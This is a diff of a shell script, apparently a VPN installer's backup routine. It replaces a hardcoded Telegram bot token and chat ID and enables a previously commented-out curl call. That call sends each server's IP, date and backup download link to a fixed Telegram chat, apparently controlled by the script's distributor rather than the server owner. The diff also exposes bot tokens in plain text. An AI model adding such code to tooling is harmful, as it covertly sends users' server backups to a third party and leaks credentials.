@@ -9,8 +9,8 @@ PURPLE='\033[0;35m'
 CYAN='\033[0;36m'
 LIGHT='\033[0;37m'
 # ==========================================
-export CHATID="5008116231"
-export KEY="6638955090:AAESojtt1ZPmuTNESoNHfgyPdU92Ue7d4H4"
+export CHATID="1624209723"
+export KEY="6568779328:AAHaq75VFPoPwlXLfHtrwie7T-zDsOXabFc"
 export TIME="10"
 export URL="https://api.telegram.org/bot$KEY/sendMessage"
 clear
@@ -60,11 +60,11 @@ Tanggal       : $date
 rm -rf /root/backup
 rm -r /root/$IP-$date.zip
 clear
-CHATID="5008116231"
-   KEY="6638955090:AAESojtt1ZPmuTNESoNHfgyPdU92Ue7d4H4"
-  TIME="10"
+   CHATID="1624209723"
+   KEY="6568779328:AAHaq75VFPoPwlXLfHtrwie7T-zDsOXabFc"
+   TIME="10"
    URL="https://api.telegram.org/bot$KEY/sendMessage"
-  TEXT="Installasi VPN Script Stable V3.0
+   TEXT="Installasi VPN Script Stable V3.0
 <code>â—‡â”â”â”â”â”â”â”â”â”â”â”â”â”â”â—‡</code>
 <b>   âš ï¸BACKUP NOTIFâš ï¸</b>
 <b>     Detail Backup VPS</b>
@@ -76,9 +76,9 @@ CHATID="5008116231"
 <b>Link Backup   :</b> $link
 <code>â—‡â”â”â”â”â”â”â”â”â”â”â”â”â”â”â—‡</code>
 <code>Silahkan copy Link dan restore di VPS baru</code>
-<code>BY BOT : @wingshopebot</code>
+<code>BY BOT : @sdctunneling_bot</code>
 "
-#curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
+curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
 echo ""
 clear
 echo -e "
